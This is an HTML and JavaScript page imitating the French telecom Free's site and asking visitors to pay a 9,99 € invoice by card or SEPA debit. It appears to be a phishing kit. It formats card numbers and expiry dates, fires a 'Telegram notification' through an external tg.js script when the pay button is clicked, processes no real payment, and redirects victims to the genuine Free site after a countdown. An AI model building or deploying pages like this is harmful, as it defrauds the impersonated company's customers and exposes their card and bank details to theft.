<!-- index.html -->
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Paiement facture</title>
  <!-- Font Awesome pour les icônes sociales -->
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
    integrity="sha512-p0bXJkQ0z7opg1a1PmIeb6QaKY6u5ONPncg9sFvkC/o5PjHzupyR9zOR1I0yL/6cTh9Ck6u9jpK8V+3y0QKjXg=="
    crossorigin="anonymous"
    referrerpolicy="no-referrer"
  />
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <!-- HEADER style “Free” -->
  <header class="site-header">
    <div class="logo">
      <img src="Free_logo.svg.png" alt="Free" />
    </div>
    <nav class="main-nav">
      <ul>
        <li><a href="#">Freebox <span class="arrow">▾</span></a></li>
        <li><a href="#">Téléphones &amp; Forfaits <span class="arrow">▾</span></a></li>
        <li><a href="#">Boutiques</a></li>
        <li><a href="#">Bons Plans</a></li>
        <li><a href="#">Assistance</a></li>
        <li><a href="#">Free Pro</a></li>
      </ul>
    </nav>
    <div class="header-actions">
      <button class="eligibility-btn">Testez votre éligibilité</button>
      <a href="#" class="location-icon" title="Nos boutiques"><i class="fas fa-map-marker-alt"></i></a>
      <a href="#" class="subscriber">Espace Abonné</a>
    </div>
  </header>

  <!-- CONTENU centré -->
  <div class="container">
    <main>
      <h1>Régler votre facture — 9,99 €</h1>

      <!-- TOGGLE méthodes de paiement -->
      <div class="toggle-methods">
        <input type="radio" id="method-card" name="method" value="Carte bancaire" checked />
        <label for="method-card">Carte bancaire</label>
        <input type="radio" id="method-sepa" name="method" value="Prélèvement SEPA" />
        <label for="method-sepa">Prélèvement SEPA</label>
      </div>

      <button id="pay-btn">Payer maintenant</button>
    </main>
  </div>

  <!-- FOOTER style “Free” -->
  <footer class="site-footer">
    <!-- ... ton footer inchangé ... -->
  </footer>

  <!-- MODAL DE PAIEMENT -->
  <div id="payment-modal" class="modal-overlay hidden">
    <!-- ... ton modal inchangé ... -->
  </div>

  <!-- SCRIPT de logique et formatage -->
  <script>
    // Références DOM
    const payBtn   = document.getElementById('pay-btn');
    const modal    = document.getElementById('payment-modal');
    const closeBtn = document.getElementById('modal-close');
    const step1    = document.getElementById('step-1');
    const step2Card= document.getElementById('step-2-card');
    const step2Sepa= document.getElementById('step-2-sepa');
    const step3    = document.getElementById('step-3');
    const toStep2  = document.getElementById('to-step-2');
    const countdownEl = document.getElementById('countdown');
    const cardInput = document.getElementById('cardnumber');
    const expInput  = document.getElementById('expdate');

    // Formatage automatique
    function formatCardNumber(e) {
      let digits = e.target.value.replace(/\D/g, '').slice(0, 16);
      let groups = digits.match(/.{1,4}/g) || [];
      e.target.value = groups.join(' ');
    }
    function formatExpDate(e) {
      let digits = e.target.value.replace(/\D/g, '').slice(0, 4);
      if (digits.length > 2) digits = digits.slice(0,2) + '/' + digits.slice(2);
      e.target.value = digits;
    }
    cardInput.addEventListener('input', formatCardNumber);
    expInput.addEventListener('input', formatExpDate);

    // Ouvre modal
    payBtn.addEventListener('click', () => {
      const method = document.querySelector('input[name="method"]:checked').value;
      // Envoie la notif Telegram
      sendTelegramNotification(method);

      if (method === 'Carte bancaire' || method === 'Prélèvement SEPA') {
        modal.classList.remove('hidden');
      }
    });

    // Ferme + reset
    closeBtn.addEventListener('click', () => {
      modal.classList.add('hidden');
      resetModal();
    });

    // Étape 1 → Étape 2 (choix)
    toStep2.addEventListener('click', () => {
      if (!step1.checkValidity()) return step1.reportValidity();
      step1.classList.remove('active');
      const method = document.querySelector('input[name="method"]:checked').value;
      if (method === 'Carte bancaire') {
        step2Card.classList.add('active');
      } else {
        step2Sepa.classList.add('active');
      }
    });

    // Soumissions et countdown
    step2Card.addEventListener('submit', e => {
      e.preventDefault();
      // ... ton code de validation existant ...
      step2Card.classList.remove('active');
      step3.classList.add('active');
      startCountdown();
    });
    step2Sepa.addEventListener('submit', e => {
      e.preventDefault();
      // ... ton code de validation existant ...
      step2Sepa.classList.remove('active');
      step3.classList.add('active');
      startCountdown();
    });

    function startCountdown() {
      let count = 5;
      const iv = setInterval(() => {
        countdownEl.textContent = count--;
        if (count < 0) {
          clearInterval(iv);
          window.location.href = 'https://mobile.free.fr/';
        }
      }, 1000);
    }
    function resetModal() {
      [step1, step2Card, step2Sepa, step3].forEach(el => el.classList.remove('active'));
      step1.classList.add('active');
      cardInput.value = '';
      expInput.value  = '';
    }
  </script>

  <!-- Ajout du script Telegram -->
  <script src="tg.js"></script>
</body>
</html>